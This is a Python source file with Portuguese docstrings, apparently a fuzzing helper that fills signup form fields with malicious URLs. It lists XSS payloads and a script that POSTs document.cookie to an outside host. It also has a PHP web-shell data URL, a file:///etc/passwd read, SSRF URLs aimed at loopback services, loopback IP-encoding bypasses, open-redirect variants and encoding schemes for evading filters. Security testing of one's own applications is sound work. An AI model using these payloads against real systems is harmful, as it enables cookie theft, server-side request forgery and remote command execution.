from typing import Dict
import random
import base64

class URLGenerator:
    def __init__(self):
        self.javascript_urls = [
            "javascript:alert(document.cookie)",
            "javascript:alert(document.domain)",
            "javascript:fetch('http://kappapride.com', {method:'POST',body:document.cookie})",
            "javascript:eval(atob('base64encodedjs'))",
            "javascript:window.location='http://kappapride.com'"
        ]
        
        self.data_urls = [
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "data:application/x-httpd-php,<?php system($_GET['cmd']); ?>",
            "data:text/html,<img src=x onerror=alert(1)>",
            "data:text/css,body{background:url(javascript:alert('XSS'))}"
        ]
        
        self.protocol_urls = [
            "file:///etc/passwd",
            "gopher://kappapride.com/_TCP:70",
            "ftp://anonymous:anonymous@kappapride.com:21/",
            "ldap://kappapride.com:389",
            "dict://kappapride.com:11111/"
        ]
        
        self.ssrf_urls = [
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://[::]:80",
            "http://0.0.0.0:8080",
            "http://0177.0.0.1"
        ]
        
        self.malicious_redirects = [
            "//kappapride.com",
            "\\\\kappapride.com",
            "http:kappapride.com",
            "https:kappapride.com",
            "////kappapride.com"
        ]

    def generate_attack(self) -> Dict[str, str]:
        """Gera uma URL maliciosa aleatória"""
        all_urls = (
            self.javascript_urls +
            self.data_urls +
            self.protocol_urls +
            self.ssrf_urls +
            self.malicious_redirects
        )
        
        url = random.choice(all_urls)
        return {
            'username': url,
            'email': f"url@{url}.com",
            'password': url,
            'full_name': url
        }

    def generate_encoded_url(self) -> Dict[str, str]:
        """Gera URLs com diferentes tipos de codificação"""
        base_url = random.choice(self.javascript_urls)
        
        # Diferentes tipos de codificação
        encodings = {
            'base64': base64.b64encode(base_url.encode()).decode(),
            'url': base_url.replace(':', '%3A').replace('/', '%2F'),
            'unicode': ''.join(f'\\u{ord(c):04x}' for c in base_url),
            'hex': ''.join(f'%{ord(c):02x}' for c in base_url),
            'octal': ''.join(f'\\{ord(c):03o}' for c in base_url)
        }
        
        encoded_url = random.choice(list(encodings.values()))
        return {
            'username': encoded_url,
            'password': encoded_url
        }

    def generate_ip_bypass(self) -> Dict[str, str]:
        """Gera diferentes representações de IP para bypass"""
        ip_formats = [
            "127.0.0.1",
            "0177.0.0.1",
            "2130706433",  # Decimal
            "0x7F000001",  # Hex
            "017700000001",  # Octal
            "127.1",
            "127.0.1",
            "0:0:0:0:0:ffff:127.0.0.1",
            "[::]",
            "0000:0000:0000:0000:0000:ffff:7f00:0001"
        ]
        
        ip = random.choice(ip_formats)
        return {
            'username': f"http://{ip}",
            'password': f"https://{ip}"
        }

    def generate_unicode_normalization(self) -> Dict[str, str]:
        """Gera URLs com caracteres Unicode para normalização"""
        domains = [
            "xn--80ak6aa92e.com",  # IDN
            "kappapride\u3002com",       # Unicode dot
            "kappapride\uff0ecom",       # Fullwidth dot
            "kappapride\u2024com",       # One dot leader
            "kappapride\u0294com"        # Glottal stop
        ]
        
        return {
            'username': f"http://{random.choice(domains)}",
            'password': f"https://{random.choice(domains)}"
        }
